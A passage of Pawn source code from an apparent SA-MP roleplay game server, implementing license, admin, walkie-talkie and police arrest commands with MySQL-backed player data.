	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pMember] != 12) return SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: You're not instructor.");
		new licid,string[200],giveplayer[30],sendername[30];
		if(sscanf(params, "d", licid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/acceptlic <License ID>");
		if(licensesend[licid] == -1) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}Invalid license ID.");
		if(PlayerInfo[licid][pMember] == 12) return SCM(playerid,0xFFFFFFFF, "{FFB870}Error: The player has instructor.");
		licenseaccepted[licid] = 1;
		licensesend[licid] = -1;
		GetPlayerName(playerid, sendername,sizeof(sendername));
		new licenta[100];
		GetPVarString(playerid, "License", licenta, sizeof(licenta));
		format(string, sizeof(string),"{FFFF45}Instructor %s accepted your license. You now have %s license.",sendername,licenta);
 		SCM(licid,COLOR_SERVER,string);
 		GetPlayerName(licid,giveplayer,sizeof(giveplayer));
 		format(string, sizeof(string),"{FFFF45}You accepted %s license request.",giveplayer);
 		SCM(playerid,COLOR_SERVER,string);
 		format(string, sizeof(string),"{FFFF45}Instructor %s accepted %s license request.",sendername,giveplayer);
 		SendFamilyMessage(12, COLOR_SERVER, string);
		if(arenevoiedelicenta[licid] == 1)
		{
			PlayerInfo[licid][pGunLic] = 1;
		    PlayerInfo[licid][pGunLicT] = 100;
			PlayerInfo[licid][pGunLicSuspend] = 0;
			Update(licid, pGunLicSuspendx);
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `GunLic`='1',`GunLicT`='100' WHERE `ID`='%d'",PlayerInfo[licid][pSQLID]);
			mysql_tquery(SQL,str,"","");
		}
		if(arenevoiedelicenta[licid] == 2)
		{
			PlayerInfo[licid][pFlyLic] = 1;
		    PlayerInfo[licid][pFlyLicT] = 100;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `FlyLic`='1',`FlyLicT`='100' WHERE `ID`='%d'",PlayerInfo[licid][pSQLID]);
			mysql_tquery(SQL,str,"","");
		}
		if(arenevoiedelicenta[licid] == 3)
		{
			PlayerInfo[licid][pBoatLic] = 1;
		    PlayerInfo[licid][pBoatLicT] = 100;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `BoatLic`='1',`BoatLicT`='100' WHERE `ID`='%d'",PlayerInfo[licid][pSQLID]);
			mysql_tquery(SQL,str,"","");
		}
		arenevoiedelicenta[licid] = 0;
 		DeletePVar(licid, "License");
 	}
	return 1;
}
CMD:showlicenses(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new id;
        if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/showlicenses <Name/Playerid>");
        if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
        if(!ProxDetectorS(8.0, playerid, id)) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
		if(Spectate[id] != -1) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
		new text1[20],text2[20],text3[20],text4[20],string[128],sendername[30];
		if(PlayerInfo[playerid][pCarLic] == 1) { text1 = "Passed"; } else { text1 = "Not Passed"; }
		if(PlayerInfo[playerid][pFlyLic] == 1) { text2 = "Passed"; } else { text2 = "Not Passed"; }
		if(PlayerInfo[playerid][pBoatLic] == 1) { text3 = "Passed"; } else { text3 = "Not Passed"; }
        if(PlayerInfo[playerid][pGunLic] == 1) { text4 = "Passed"; } else { text4 = "Not Passed"; }
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string, sizeof(string), "---- %s's licenses ----", sendername);
	    SendClientMessage(id, COLOR_SERVER, string);
	    if(PlayerInfo[playerid][pCarLicT] == 0)
	    {
        	format(string, sizeof(string), "Drivers licence: %s", text1);
        	SendClientMessage(id, COLOR_SERVER, string);
        }
	    else
	    {
        	format(string, sizeof(string), "Drivers licence: %s (expires in %d hours)", text1,PlayerInfo[playerid][pCarLicT]);
        	SendClientMessage(id, COLOR_SERVER, string);
        }
        if(PlayerInfo[playerid][pFlyLicT] == 0)
	    {
			format(string, sizeof(string), "Flying licence: %s", text2);
			SendClientMessage(id, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Flying licence: %s (expires in %d hours)", text2,PlayerInfo[playerid][pFlyLicT]);
			SendClientMessage(id, COLOR_SERVER, string);
		}
        if(PlayerInfo[playerid][pBoatLicT] == 0)
	    {
			format(string, sizeof(string), "Boat licence: %s", text3);
			SendClientMessage(id, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Boat licence: %s (expires in %d hours)", text3,PlayerInfo[playerid][pBoatLicT]);
			SendClientMessage(id, COLOR_SERVER, string);
		}
		if(PlayerInfo[playerid][pGunLicT] == 0)
	    {
			format(string, sizeof(string), "Weapon licence: %s", text4);
			SendClientMessage(id, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Weapon licence: %s (expires in %d hours)", text4,PlayerInfo[playerid][pGunLicT]);
			SendClientMessage(id, COLOR_SERVER, string);
		}
		SendClientMessage(id, COLOR_SERVER, "------------");
		new giveplayer[25];
		GetPlayerName(playerid,sendername,sizeof(sendername));
		GetPlayerName(id,giveplayer,sizeof(giveplayer));
		format(string, sizeof(string), "* %s has shown his/her Licenses to you.", sendername);
		SendClientMessage(id, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), "* You have shown your Licenses to %s.", giveplayer);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
    return 1;
}
CMD:alicenses(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
		new id;
        if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/alicenses <Name/Playerid>");
        if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
        new text1[20],text2[20],text3[20],text4[20],string[128],giveplayer[30];
		if(PlayerInfo[id][pCarLic] == 1) { text1 = "Passed"; } else { text1 = "Not Passed"; }
		if(PlayerInfo[id][pFlyLic] == 1) { text2 = "Passed"; } else { text2 = "Not Passed"; }
		if(PlayerInfo[id][pBoatLic] == 1) { text3 = "Passed"; } else { text3 = "Not Passed"; }
        if(PlayerInfo[id][pGunLic] == 1) { text4 = "Passed"; } else { text4 = "Not Passed"; }
        GetPlayerName(id, giveplayer, sizeof(giveplayer));
        format(string,sizeof(string),"---- %s's licenses ----", giveplayer);
	    SendClientMessage(playerid, COLOR_SERVER, string);
	    if(PlayerInfo[id][pCarLicT] == 0)
	    {
        	if(PlayerInfo[id][pCarLicSuspend] == 0)
			{
				format(string, sizeof(string), "Drivers licence: %s", text1);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
			else if(PlayerInfo[id][pCarLicSuspend] > 0)
			{
				format(string, sizeof(string), "Drivers licence: Suspended (suspended for %d hours)", PlayerInfo[id][pCarLicSuspend]);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
        }
	    else
	    {
        	format(string, sizeof(string), "Drivers licence: %s (expires in %d hours)", text1,PlayerInfo[id][pCarLicT]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
        }
        if(PlayerInfo[id][pFlyLicT] == 0)
	    {
			format(string, sizeof(string), "Flying licence: %s", text2);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Flying licence: %s (expires in %d hours)", text2,PlayerInfo[id][pFlyLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
        if(PlayerInfo[id][pBoatLicT] == 0)
	    {
			format(string, sizeof(string), "Boat licence: %s", text3);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Boat licence: %s (expires in %d hours)", text3,PlayerInfo[id][pBoatLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(PlayerInfo[id][pGunLicT] == 0)
	    {
			if(PlayerInfo[id][pGunLicSuspend] == 0)
			{
				format(string, sizeof(string), "Weapon licence: %s", text4);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
			else if(PlayerInfo[id][pGunLicSuspend] > 0)
			{
				format(string, sizeof(string), "Weapon licence: Suspended (suspended for %d hours)", PlayerInfo[id][pGunLicSuspend]);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
		else
		{
			format(string, sizeof(string), "Weapon licence: %s (expires in %d hours)", text4,PlayerInfo[id][pGunLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		SendClientMessage(playerid, COLOR_SERVER, "------------");
	}
    return 1;
}
CMD:licenses(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new text1[20],text2[20],text3[20],text4[20],string[128],sendername[30];
		if(PlayerInfo[playerid][pCarLic] == 1) { text1 = "Passed"; } else { text1 = "Not Passed"; }
		if(PlayerInfo[playerid][pFlyLic] == 1) { text2 = "Passed"; } else { text2 = "Not Passed"; }
		if(PlayerInfo[playerid][pBoatLic] == 1) { text3 = "Passed"; } else { text3 = "Not Passed"; }
        if(PlayerInfo[playerid][pGunLic] == 1) { text4 = "Passed"; } else { text4 = "Not Passed"; }
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string,sizeof(string),"---- %s's licenses ----", sendername);
	    SendClientMessage(playerid, COLOR_SERVER, string);
	    if(PlayerInfo[playerid][pCarLicT] == 0)
	    {
			if(PlayerInfo[playerid][pCarLicSuspend] == 0)
			{
				format(string, sizeof(string), "Drivers licence: %s", text1);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
			else if(PlayerInfo[playerid][pCarLicSuspend] > 0)
			{
				format(string, sizeof(string), "Drivers licence: Suspended (suspended for %d hours)", PlayerInfo[playerid][pCarLicSuspend]);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
        }
	    else
	    {
        	format(string, sizeof(string), "Drivers licence: %s (expiers in %d hours)", text1,PlayerInfo[playerid][pCarLicT]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
        }
        if(PlayerInfo[playerid][pFlyLicT] == 0)
	    {
			format(string, sizeof(string), "Flying licence: %s", text2);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Flying licence: %s (expires in %d hours)", text2,PlayerInfo[playerid][pFlyLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
        if(PlayerInfo[playerid][pBoatLicT] == 0)
	    {
			format(string, sizeof(string), "Boat licence: %s", text3);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		else
		{
			format(string, sizeof(string), "Boat licence: %s (expires in %d hours)", text3,PlayerInfo[playerid][pBoatLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(PlayerInfo[playerid][pGunLicT] == 0)
	    {
			if(PlayerInfo[playerid][pGunLicSuspend] == 0)
			{
				format(string, sizeof(string), "Weapon licence: %s", text4);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
			else if(PlayerInfo[playerid][pGunLicSuspend] > 0)
			{
				format(string, sizeof(string), "Weapon licence: Suspended (suspended for %d hours)", PlayerInfo[playerid][pGunLicSuspend]);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
		else
		{
			format(string, sizeof(string), "Weapon licence: %s (expires in %d hours)", text4,PlayerInfo[playerid][pGunLicT]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
		SendClientMessage(playerid, COLOR_SERVER, "------------");
	}
    return 1;
}
CMD:setint(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,intid,string[50];
		if(sscanf(params, "ud", id,intid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setint <Name/Playerid> <Interior ID>");
	    if(IsPlayerConnected(id))
	    {
	        if(id != INVALID_PLAYER_ID)
	        {
				SetPlayerInterior(id,intid);
				PlayerInfo[id][pInt] = intid;
				format(string, sizeof(string), "You have set the players interiorid %d.", intid);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
		else return SCM(playerid,COLOR_SERVER,"{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:setvw(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new id,vwid,string[50];
		if(sscanf(params, "ud", id,vwid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setvw <Name/Playerid> <Virtual World>");
	    if(IsPlayerConnected(id))
	    {
	        if(id != INVALID_PLAYER_ID)
	        {
				SetPlayerVirtualWorld(id,vwid);
				format(string, sizeof(string), "* You have set the players virtual world %d.", vwid);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
		else return SCM(playerid,COLOR_SERVER,"{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:wthelp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pWTalkie] == 0) return SCM(playerid, 0xFFFFFFFF, "{CCCC00}Error: You don't have a Walkie Talkie.");
	SCM(playerid,COLOR_SERVER,"{3385FF}Walkie Talkie: /togwt /setfreq /wt");
	return 1;
}
CMD:togwt(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pWTalkie] == 0) return SCM(playerid, 0xFFFFFFFF, "{CCCC00}Error: You don't have a Walkie Talkie.");
	if(WTToggle[playerid] == true)
	{
	    WTToggle[playerid] = false;
	    SCM(playerid, COLOR_SERVER,"You have disabled your radio.");
	}
	else
	{
	    WTToggle[playerid] = true;
	    SCM(playerid, COLOR_SERVER, "You have enabled your radio.");
	}
	return 1;
}
CMD:showfreq(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,string[64];
    if(sscanf(params, "u",id)) return SCM(playerid, 0xFFFFFFFF, "{B8DBFF}{A9C4E4}Usage: {FFFFFF}/showfreq <Name/Playerid>");
    if(PlayerInfo[id][pWTalkie] == 0) return SCM(playerid, 0xFFFFFFFF, "{CCCC00}Error: This player don't have a Walkie Talkie.");
   	format(string, sizeof(string), "{B8FFDB}Walkie Talkie Frequency %.1f.",WTChannel[id]);
    SCM(playerid, COLOR_SERVER, string);
    return 1;
}
CMD:setfrequency(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new string[256];
	if(PlayerInfo[playerid][pWTalkie] == 0) return SCM(playerid, 0xFFFFFFFF, "{CCCC00}Error: You don't have a Walkie Talkie.");
	new Float:freqss2;
    if(sscanf(params, "f",freqss2)) return SCM(playerid, 0xFFFFFFFF, "{B8DBFF}{A9C4E4}Usage: {FFFFFF}/setfreq <Frequency(89.5 of 98.5)>");
    if(freqss2 < 89.5 || freqss2 > 98.5 ) return SCM(playerid, 0xFFFFFFFF, "{B8DBFF}{A9C4E4}Usage: {FFFFFF}/setfreq <Frequency(89.5 of 98.5)>");
	if(WTToggle[playerid] == false) return SCM(playerid, 0xFFFFFFFF, "{FFB870}Error: Your walkie talkie is turned off.");
	if(freqss2 == WTChannel[playerid]) return SCM(playerid, 0xFFFFFFFF, "{FFB870}Error: You are already in this channel.");
    format(string, sizeof(string), "{B8FFDB}You set your Walkie Talkie Frequency to %.2f.",freqss2);
    SCM(playerid, COLOR_SERVER, string);
	WTChannel[playerid] = freqss2;
	return 1;
}
CMD:setfreq(playerid, params[])
{
	return cmd_setfrequency(playerid, params);
}
CMD:wt(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pWTalkie] == 0) return SCM(playerid, 0xFFFFFFFF, "{CCCC00}ERROR: You don't have a Walkie Talkie.");
	new msg[128],sendername[25],string[256];
    if(PlayerInfo[playerid][pMuted] == 1)
    {
		format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
		SendClientMessage(playerid, COLOR_ERROR, string);
		return 1;
	}
	if(sscanf(params, "s[128]", msg)) return SCM(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/wt <Message>");
	if(WTToggle[playerid] == false) return SCM(playerid, 0xFFFFFFFF, "{FFB870}Error: Your walkie talkie is turned off.");
	if(WTChannel[playerid] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Error: Please set frequency.");
	GetPlayerName(playerid,sendername,sizeof(sendername));
	foreach(Player, i)
	{
	    if(WTToggle[i] == true)
	    {
	        if(WTChannel[i] == WTChannel[playerid])
	        {
				format(string, sizeof(string), "{54BF9C}[Freq: %.2f]: %s: %s",WTChannel[playerid],sendername, msg);
				SCM(i, COLOR_SERVER, string);
				format(string ,sizeof(string),"(radio) ''%s''", params);
				SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
				if(FindIP(msg)) /// Anti-Reclama
				{
					new advertiser[MAX_PLAYER_NAME];
					GetPlayerName(playerid, advertiser, sizeof(advertiser));
					format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /wt.", advertiser, playerid, msg);
					ABroadCast(COLOR_SERVER,string,1);
				}
				for(new d; d < sizeof(TLD); d++)
				{
					if(strfind(msg, TLD[d], true) != -1)
					{
						if(strfind(msg, "wwww.Magic-Gaming.tk", true) != -1 || strfind(msg, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(msg, "Magic-Gaming.tk", true) != -1) break;
						new advertiser[MAX_PLAYER_NAME];
						GetPlayerName(playerid, advertiser, sizeof(advertiser));
						format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /wt.", advertiser, playerid, msg);
						ABroadCast(COLOR_SERVER,string,1);
					}
				}
				for(new adm = 0; adm<=MAX_PLAYERS;adm++)
				{
    				if(IsPlayerConnected(adm))
					{
	    				if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
    	    			{
   	        				format(string, sizeof(string), "[Freq: %.2f]: %s: %s",WTChannel[playerid],sendername,msg);
							SendClientMessage(adm,  COLOR_YELLOW, string);
  	    				}
					}
				}
	        }
	    }
	}
	return 1;
}
CMD:arrest(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new tmpcar = GetPlayerVehicleID(playerid);
	if(IsACop(playerid))
	{
        if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{3385FF}You are not on Duty.");
		new id,sendername[30],giveplayer[30],string[186];
		if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/arrest <Name/Playerid>");
		new tmpcar2 = GetPlayerVehicleID(id);
		if(IsPlayerConnected(id))
		{
			if(GetDistanceBetweenPlayers(playerid,id) < 5)
			{
				if( GetPlayerState(playerid) == PLAYER_STATE_DRIVER && Copcar2(tmpcar) && tmpcar == tmpcar2 && PlayerToPoint(10.0, playerid, 1526.2357,-1678.0305,5.8906) || PlayerToPoint(6.0, playerid, 268.9264,81.9687,1001.0391) || PlayerToPoint(4.0, playerid, 2282.1289,2425.7620,3.4692) || PlayerToPoint(4.0, playerid, -1606.2998,672.7838,-5.2422))
				{
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(PlayerInfo[id][pWantedLevel] < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player must be at least Wanted Level 1.");
					if(PlayerInfo[id][pWantedLevel] == 1)
					{
						GivePlayerCash(id, -10000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 10000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
						ResetPlayerWeapons(id);
						JailPrice[id] = 50000;
						PlayerInfo[id][pJailTime] = 8 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
						PlayerInfo[playerid][pArrestss] += 1;
						Update(playerid,pArrestssx);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $10000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $10000 with a sentence of 480 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
					if(PlayerInfo[id][pWantedLevel] == 2)
					{
						GivePlayerCash(id, -12000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 12000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
						ResetPlayerWeapons(id);
						JailPrice[id] = 100000;
						PlayerInfo[id][pJailTime] = 12 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $12000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						SetPlayerSkin(id, PlayerInfo[id][pModel]);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $12000 with a sentence of 720 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
					if(PlayerInfo[id][pWantedLevel] == 3)
					{
						GivePlayerCash(id, -14000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 14000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
						ResetPlayerWeapons(id);
						JailPrice[id] = 150000;
						PlayerInfo[id][pJailTime] = 16 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $14000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						SetPlayerSkin(id, PlayerInfo[id][pModel]);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
